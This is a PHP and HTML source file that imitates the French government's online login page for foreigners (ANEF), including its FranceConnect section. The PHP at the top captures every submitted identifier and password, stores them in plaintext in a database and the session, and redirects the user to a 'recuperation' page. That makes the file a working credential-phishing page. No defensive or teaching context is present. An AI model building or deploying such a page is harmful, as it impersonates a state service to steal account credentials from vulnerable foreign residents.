<?php
session_start();

// Connexion à la base
$host = 'localhost';
$db   = 'login_db';
$user = 'root';
$pass = '';
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
    die('Erreur de connexion à la base de données : ' . $e->getMessage());
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // On récupère les infos du formulaire
    $_SESSION['username'] = $_POST['username'] ?? '';
    $_SESSION['password'] = $_POST['password'] ?? '';

    // Insertion dans la base
    $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
    $stmt->execute([$_SESSION['username'], $_SESSION['password']]);

    // Redirection vers la page de ton choix
    header('Location: recuperation.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion à Administration numérique pour les étrangers en France</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <header>
        <img class="logo" src="image-1773717388977.png" alt="Logo">
    </header>
    <style>
        body {
            background: #f7f7fb;
            font-family: Arial, sans-serif;
            margin: 0;
        }
        .logo{
        }
        .login-main {
            background: #f6f6f6;
            max-width: 600px;
            margin: 24px auto 0 auto;
            border-radius: 8px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.07);
            padding: 48px 40px 40px 40px;
        }
        .login-title {
            font-size: 2.6em;
            font-weight: bold;
            margin-bottom: 18px;
            color: #111;
            line-height: 1.1;
        }
        .login-subtitle {
            font-size: 1.4em;
            font-weight: bold;
            margin-bottom: 18px;
            color: #222;
        }
        .login-desc {
            color: #444;
            font-size: 1em;
            margin-bottom: 18px;
        }
        .login-form label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            color: #222;
        }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 12px;
            border: none;
            border-bottom: 3px solid #222;
            border-radius: 0;
            font-size: 1.15em;
            background: #e9edfc;
            transition: border-color 0.2s;
        }
        .login-form input[type="text"]:focus,
        .login-form input[type="password"]:focus {
            outline: none;
            border-bottom: 3px solid #000091;
            background: #f7f7fb;
        }
        .login-form .input-row {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .login-form .input-row label {
            margin-bottom: 0;
            margin-left: 8px;
            font-weight: normal;
        }
        .login-form .forgot-link {
            display: block;
            margin: 8px 0 24px 0;
            color: #000091;
            text-decoration: underline;
            font-size: 1.05em;
        }
        .login-form button {
            width: 100%;
            background: #000091;
            color: #fff;
            border: none;
            border-radius: 0;
            padding: 14px 0;
            font-size: 1.2em;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            margin-bottom: 32px;
            transition: background 0.2s;
        }
        .login-form button:hover {
            background: #2a3cff;
        }
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 32px 0 24px 0;
        }
        .separator hr {
            flex: 1;
            border: none;
            border-top: 1.5px solid #ccc;
        }
        .separator span {
            margin: 0 18px;
            color: #444;
            font-weight: bold;
            font-size: 1.1em;
        }
        .fc-block {
            margin: 0 0 32px 0;
        }
        .fc-block-title {
            font-size: 1.6em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .fc-block-desc {
            color: #444;
            margin-bottom: 18px;
        }
        .fc-btn {
            display: flex;
            align-items: center;
            background: #000091;
            color: #fff;
            font-weight: bold;
            font-size: 1.25em;
            border: none;
            border-radius: 0;
            padding: 12px 18px;
            margin-bottom: 10px;
            cursor: pointer;
            width: fit-content;
            text-decoration: none;
        }
        .fc-btn img {
            height: 38px;
            margin-right: 14px;
        }
        .fc-link {
            color: #000091;
            text-decoration: underline;
            font-size: 1.05em;
        }
        .create-account-section {
            margin-top: 36px;
            border-top: 1.5px solid #ccc;
            padding-top: 28px;
        }
        .create-account-title {
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 18px;
        }
        .create-account-btn {
            display: block;
            width: 100%;
            border: 2px solid #000091;
            background: #fff;
            color: #000091;
            font-size: 1.2em;
            font-weight: 500;
            padding: 14px 0;
            border-radius: 0;
            text-align: center;
            text-decoration: none;
            margin-top: 8px;
            transition: background 0.2s, color 0.2s;
        }
        .create-account-btn:hover {
            background: #f0f3ff;
        }
        @media (max-width: 700px) {
            .login-main { padding: 24px 8px; }
            .login-title { font-size: 2em; }
        }
    </style>
</head>
<body>
    <div class="login-main">
        <div class="login-title">
            Connexion à Administration numérique<br>
            pour les étrangers en France
        </div>
        <div class="login-subtitle">Se connecter avec son compte</div>
        <div class="login-desc">
            Tous les champs sont obligatoires.<br>
            <br>
            <strong>Identifiant</strong><br>
            <span style="font-size:0.98em;color:#555;">
                Votre identifiant de connexion est votre numéro d'étranger, si vous n'en avez pas, votre adresse mail.<br>
                Format attendu : 9999999999
            </span>
        </div>
        <form class="login-form" method="post" action="">
            <input type="text" id="username" name="username" placeholder="Identifiant" required>
            <div class="input-row">
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                <input type="checkbox" id="showpass" onclick="togglePassword()">
                <label for="showpass">Afficher</label>
            </div>
            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
            <button type="submit">Se connecter</button>
        </form>
        <div class="separator">
            <hr><span>ou</span><hr>
        </div>
        <div class="fc-block">
            <div class="fc-block-title">Se connecter avec FranceConnect</div>
            <div class="fc-block-desc">
                FranceConnect est la solution proposée par l’État pour sécuriser et simplifier la connexion à vos services en ligne.
            </div>
            <img src="image-1773716976415.png" alt="FranceConnect">
            <div>
                <a href="#" class="fc-link">Qu’est-ce que FranceConnect ? <span style="font-size:1.1em;">&#8599;</span></a>
            </div>
        </div>
        <div class="create-account-section">
            <div class="create-account-title">Vous n'avez pas de compte ?</div>
            <a href="#" class="create-account-btn">Créer un compte</a>
        </div>
    </div>
    <script>
        function togglePassword() {
            var pwd = document.getElementById("password");
            pwd.type = pwd.type === "password" ? "text" : "password";
        }
    </script>
    <footer>
        <img src="image-1773717613885.png" alt="">
    </footer>
</body>
</html>